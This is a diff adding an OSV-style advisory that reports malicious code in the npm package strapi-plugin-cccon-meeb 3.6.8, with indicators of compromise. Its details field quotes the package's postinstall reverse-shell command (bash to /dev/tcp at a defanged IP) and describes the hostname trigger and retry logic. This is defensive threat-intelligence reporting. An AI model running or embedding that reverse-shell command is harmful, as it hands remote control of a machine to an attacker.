@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12163",
+  "modified": "2026-09-16T07:23:05Z",
+  "published": "2026-09-16T07:22:49Z",
+  "summary": "Malicious code in strapi-plugin-cccon-meeb (npm)",
+  "details": "The package's postinstall hook (postinstall.js) opens a reverse shell to a hardcoded remote host. On install it executes `bash -i \u003e\u0026 /dev/tcp/14[.]225[.]210[.]85/80 0\u003e\u00261`, giving the remote operator an interactive shell on the installing machine. The script retries the connection up to 5 times at 10-second intervals and only activates when the hostname matches 'ubuntu-fc-uvm', logging its activity to /tmp/postinstall-revshell.log. The package is a Strapi plugin that otherwise provides no functionality.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "strapi-plugin-cccon-meeb",
+        "purl": "pkg:npm/strapi-plugin-cccon-meeb"
+      },
+      "versions": [
+        "3.6.8"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/strapi-plugin-cccon-meeb/v/3.6.8"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12163"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-16T07:22:49Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "14[.]225[.]210[.]85",
+          "14[.]225[.]210[.]85:80"
+        ],
+        "sha256": [
+          "c8734c6a8ca0c9704d8baa5fd2311dc969121825d2968c80cccd0f07f5f3d0eb"
+        ]
+      }
+    }
+  }
+}
